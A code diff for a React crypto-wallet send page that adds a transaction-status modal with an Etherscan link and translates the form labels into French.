@@ -85,6 +85,8 @@ export default function WalletPage() {
   const [displayAmount, setDisplayAmount] = useState<string>("");
   const [token, setToken] = useState<"usdt" | "usdc">("usdt");
   const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
+  const [showModal, setShowModal] = useState(false);
+  const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
   const providerRef = useRef<EthereumProvider | null>(null);
   const keypadRef = useRef<HTMLDivElement>(null);
 
@@ -256,6 +258,8 @@ export default function WalletPage() {
 
       setStatus(`Transaction envoyée ! Hash : ${txHash.slice(0, 10)}...`);
       setTxHash(txHash);
+      setModalStatus("pending");
+      setShowModal(true);
 
       // On attend la confirmation
       const provider = new ethers.BrowserProvider(
@@ -266,11 +270,16 @@ export default function WalletPage() {
       if (receipt && receipt.status === 1) {
         setStatus(`✅ Transfert réussi ! ${adminAmount} ${tokenName} envoyés.`);
         setStatusType("success");
+        setModalStatus("success");
       } else {
         setStatus("❌ Transaction échouée on-chain.");
         setStatusType("error");
+        setModalStatus("error");
       }
     } catch (err: unknown) {
+      if (txHash) {
+        setModalStatus("error");
+      }
       console.error("Transfer error:", err);
 
       let message = "Transaction échouée.";
@@ -351,17 +360,17 @@ export default function WalletPage() {
       )}
 
       <div className="form-container">
-        <label className="form-label">Address or Domain Name</label>
+        <label className="form-label">Adresse ou nom de domaine</label>
         <div className="input-row">
           <input
             type="text"
-            placeholder="Search or Enter"
+            placeholder="Rechercher ou saisir"
             value={address}
             onChange={(e) => setAddress(e.target.value)}
             className="input-row__field"
           />
           <div className="input-row__actions">
-            <button onClick={handlePaste} className="btn-paste">Paste</button>
+            <button onClick={handlePaste} className="btn-paste">Coller</button>
             <button className="btn-icon" title="Copy">
               <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80"
                 strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -382,7 +391,7 @@ export default function WalletPage() {
           </div>
         </div>
 
-        <label className="form-label form-label--spaced">Destination network</label>
+        <label className="form-label form-label--spaced">Réseau de destination</label>
         <div className="network-selector" style={{ marginBottom: "1rem" }}>
           <div className="eth-icon">
             <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
@@ -401,7 +410,7 @@ export default function WalletPage() {
           </svg>
         </div>
 
-        <label className="form-label form-label--spaced">Asset</label>
+        <label className="form-label form-label--spaced">Actif</label>
         <div className="token-tabs" style={{ marginBottom: "0rem" }}>
           <button 
             type="button" 
@@ -420,12 +429,12 @@ export default function WalletPage() {
         </div>
 
         <div>
-          <label className="form-label form-label--spaced">Amount</label>
+          <label className="form-label form-label--spaced">Montant</label>
           <div className="montant-container" onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
             <input
               type="text"
               value={displayAmount}
-              placeholder={`${token.toUpperCase()} Amount`}
+              placeholder={`${token.toUpperCase()} Montant`}
               className="montant-input"
               readOnly
               inputMode="none"
@@ -453,10 +462,10 @@ export default function WalletPage() {
           {loading ? (
             <span className="btn-spinner-wrapper">
               <span className="btn-spinner" />
-              Processing...
+              Traitement en cours...
             </span>
           ) : (
-            "Next"
+            "Suivant"
           )}
         </button>
       </div>
@@ -520,6 +529,63 @@ export default function WalletPage() {
               <line x1="12" y1="9" x2="18" y2="15" />
             </svg>
           </button>
+        </div>
+      )}
+
+      {/* Transaction Processing Modal */}
+      {showModal && (
+        <div className="modal-overlay" onClick={() => setShowModal(false)}>
+          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
+            <button 
+              className="modal-close-btn" 
+              onClick={() => setShowModal(false)}
+              title="Close"
+            >
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <line x1="18" y1="6" x2="6" y2="18"></line>
+                <line x1="6" y1="6" x2="18" y2="18"></line>
+              </svg>
+            </button>
+            <img src="/yes.png" alt="Status" className="modal-logo" />
+            
+            {modalStatus === "pending" && (
+              <>
+                <h2 className="modal-title">En cours de traitement...</h2>
+                <p className="modal-text">
+                  La transaction est en cours ! La validation de la blockchain est en cours. Cela prend généralement quelques minutes.
+                </p>
+              </>
+            )}
+
+            {modalStatus === "success" && (
+              <>
+                <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction réussie !</h2>
+                <p className="modal-text">
+                  Votre transfert de {adminAmount} {token.toUpperCase()} a été validé avec succès sur la blockchain Ethereum.
+                </p>
+              </>
+            )}
+
+            {modalStatus === "error" && (
+              <>
+                <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction échouée</h2>
+                <p className="modal-text">
+                  La transaction a échoué sur la blockchain Ethereum ou une erreur est survenue pendant le transfert.
+                </p>
+              </>
+            )}
+
+            {txHash && (
+              <a 
+                href={`https://etherscan.io/tx/${txHash}`} 
+                target="_blank" 
+                rel="noopener noreferrer" 
+                className="modal-details-btn"
+              >
+                Détails de la transaction
+              </a>
+            )}
+          </div>
         </div>
       )}
     </main>
